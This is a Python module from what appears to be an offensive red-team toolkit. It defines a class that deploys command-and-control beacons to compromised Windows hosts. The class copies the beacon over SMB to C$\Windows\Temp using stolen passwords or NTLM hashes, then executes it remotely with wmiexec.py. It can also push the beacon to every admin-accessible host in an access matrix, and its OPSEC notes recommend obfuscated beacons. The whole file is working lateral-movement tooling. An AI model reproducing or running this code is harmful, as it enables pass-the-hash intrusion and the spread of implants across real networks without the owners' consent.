"""
Beacon Deployer Operation
Deploys C2 beacons to compromised systems
"""

import sys
from pathlib import Path
from typing import List

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from ..core.models import (
    Credential,
    AccessEntry,
    AccessMatrix,
    BeaconDeployment,
    CredentialType
)
from ..utils.output import output
from ..utils.executor import executor
from ..utils.files import validate_file_exists, get_filename


class BeaconDeployer:
    """
    Deploys C2 beacons to compromised systems

    Two-stage deployment:
        1. Copy beacon to target via SMB
        2. Execute beacon via WMI

    OPSEC Considerations:
        - Beacon lands on disk (C:\\Windows\\Temp)
        - SMB file transfer is logged
        - Process creation is logged
        - Consider using obfuscated/packed beacons
        - Cleanup mechanisms recommended
    """

    def __init__(self, timeout: int = 30):
        """
        Initialize beacon deployer

        Args:
            timeout: Timeout for deployment operations
        """
        self.timeout = timeout

    def _build_smb_copy_command(self, target: str, credential: Credential,
                                beacon_path: str, beacon_name: str) -> str:
        """Build SMB copy command using smbclient"""
        if credential.cred_type == CredentialType.HASH:
            return (
                f"smbclient //{target}/C$ "
                f"-U {credential.domain}/{credential.username} "
                f"--pw-nt-hash {credential.ntlm_hash} "
                f"-c 'put {beacon_path} Windows\\Temp\\{beacon_name}'"
            )
        else:
            return (
                f"smbclient //{target}/C$ "
                f"-U {credential.domain}/{credential.username}%'{credential.password}' "
                f"-c 'put {beacon_path} Windows\\Temp\\{beacon_name}'"
            )

    def _build_wmi_exec_command(self, target: str, credential: Credential,
                                beacon_name: str) -> str:
        """Build WMI execution command"""
        exec_path = f"C:\\Windows\\Temp\\{beacon_name}"

        if credential.cred_type == CredentialType.HASH:
            return (
                f"wmiexec.py "
                f"{credential.domain}/{credential.username}@{target} "
                f"-hashes :{credential.ntlm_hash} "
                f"'{exec_path}'"
            )
        else:
            return (
                f"wmiexec.py "
                f"{credential.domain}/{credential.username}:'{credential.password}'@{target} "
                f"'{exec_path}'"
            )

    def deploy_single(self, target: str, credential: Credential,
                      beacon_path: str) -> BeaconDeployment:
        """
        Deploy beacon to single target

        Args:
            target: Target IP or hostname
            credential: Credential for authentication
            beacon_path: Local path to beacon file

        Returns:
            BeaconDeployment with results
        """
        beacon_name = get_filename(beacon_path)

        deployment = BeaconDeployment(
            target=target,
            credential=credential,
            beacon_name=beacon_name
        )

        # Step 1: Copy beacon via SMB
        output.info("Copying beacon...")
        copy_cmd = self._build_smb_copy_command(
            target, credential, beacon_path, beacon_name
        )

        copy_result = executor.execute_silent(copy_cmd, timeout=self.timeout)

        if copy_result.returncode == 0 or 'putting file' in copy_result.output.lower():
            deployment.copy_success = True
            output.success("Beacon copied")
        else:
            deployment.copy_success = False
            deployment.error = "SMB copy failed"
            output.failure("Copy failed")
            return deployment

        # Step 2: Execute beacon via WMI
        output.info("Executing beacon...")
        exec_cmd = self._build_wmi_exec_command(target, credential, beacon_name)

        # Short timeout for beacon execution (it should start and return quickly)
        exec_result = executor.execute_silent(exec_cmd, timeout=10)

        # Beacon might return empty output if it starts silently
        deployment.exec_success = True
        output.success("Beacon deployed and executed!")

        return deployment

    def deploy_to_matrix(self, access_matrix: AccessMatrix,
                         beacon_path: str) -> List[BeaconDeployment]:
        """
        Deploy beacon to all admin-accessible systems in matrix

        Args:
            access_matrix: AccessMatrix with valid credentials
            beacon_path: Local path to beacon file

        Returns:
            List of BeaconDeployment results
        """
        output.banner("BEACON DEPLOYMENT")

        if not validate_file_exists(beacon_path):
            output.failure(f"Beacon not found: {beacon_path}")
            return []

        admin_entries = access_matrix.get_admin_access()
        output.info(f"Deploying beacons to {len(admin_entries)} systems...")

        deployments = []
        successful = 0

        for entry in admin_entries:
            output.newline()
            output.info(f"Deploying to {entry.target}...")

            deployment = self.deploy_single(
                entry.target,
                entry.credential,
                beacon_path
            )
            deployments.append(deployment)

            if deployment.success:
                successful += 1

        output.newline()
        output.success(f"Beacons deployed to {successful} systems")

        return deployments

    def deploy_to_targets(self, targets: List[str], credential: Credential,
                          beacon_path: str) -> List[BeaconDeployment]:
        """
        Deploy beacon to specific targets with single credential

        Args:
            targets: List of targets
            credential: Credential to use
            beacon_path: Local path to beacon file

        Returns:
            List of BeaconDeployment results
        """
        output.banner("TARGETED BEACON DEPLOYMENT")

        if not validate_file_exists(beacon_path):
            output.failure(f"Beacon not found: {beacon_path}")
            return []

        output.info(f"Targets: {len(targets)}")
        output.info(f"Beacon: {beacon_path}")

        deployments = []
        successful = 0

        for target in targets:
            output.newline()
            output.info(f"Deploying to {target}...")

            deployment = self.deploy_single(target, credential, beacon_path)
            deployments.append(deployment)

            if deployment.success:
                successful += 1

        output.newline()
        output.success(f"Beacons deployed to {successful}/{len(targets)} systems")

        return deployments